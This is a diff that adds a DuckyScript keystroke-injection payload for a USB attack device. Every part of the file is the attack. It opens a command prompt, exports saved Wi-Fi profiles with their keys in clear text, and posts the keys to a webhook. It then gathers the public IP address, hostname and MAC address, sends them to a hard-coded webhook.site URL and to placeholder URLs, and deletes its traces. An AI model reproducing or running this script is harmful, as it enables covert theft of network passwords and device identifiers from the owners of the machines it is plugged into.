@@ -1,0 +1,50 @@
+bash
+DELAY 1000
+GUI r
+DELAY 500
+STRING cmd
+DELAY 500
+ENTER
+DELAY 1000
+STRING cd %temp%
+ENTER
+DELAY 500
+STRING netsh wlan export profile key=clear
+ENTER
+DELAY 500
+STRING powershell Select-String -Path Wi-Fi*.xml -Pattern 'keyMaterial' > WiFi-Key
+ENTER
+DELAY 1000
+DELAY 500
+REM next command will post wifi password on webhook.site
+REM watch demo on techchip youtube channel
+STRING powershell Invoke-WebRequest -Uri Your_Webhook_Url -Method POST -InFile WiFi-Key
+ENTER
+STRING del Wi* /s/f/q
+ENTER
+DELAY 500
+STRING      ipconfig | findstr /i "ipv4"
+DELAY 500
+ENTER
+DELAY 500
+STRING      powershell -c "$ip = (iwr -usebasicparsing https://api.ipify.org).Content; $webhook = 'https://webhook.site/1df7ec5e-2327-4bac-a511-0abdf38491cb'; try { Invoke-RestMethod -Uri $webhook -Method POST -Body ('{{"ip": "{0}", "hostname": "{1}"}}' -f $ip, $(hostname)) -ContentType 'application/json' } catch { Write-Host $_.Exception.Message }"
+ENTER
+DELAY 500
+STRING      ipconfig | findstr IPv4 > %temp%\ip.txt
+DELAY 500
+ENTER
+DELAY 1000
+STRING      powershell -command "& {Invoke-RestMethod -Uri Your_Webhook_Url -Method Post -Body (Get-Content %temp%\ip.txt -Raw)}"
+DELAY 500
+ENTER
+DELAY 500
+STRING      ipconfig /all | find "Physical Address" > %temp%\macaddress.txt
+ENTER
+DELAY 1000
+STRING      powershell -command Invoke-WebRequest -Uri Your_Webhook_Url -Method POST -Body $(Get-Content %temp%\macaddress.txt -Raw)
+ENTER
+DELAY 1000
+STRING      del %temp%\macaddress.txt
+ENTER
+DELAY 500
+ALT F4
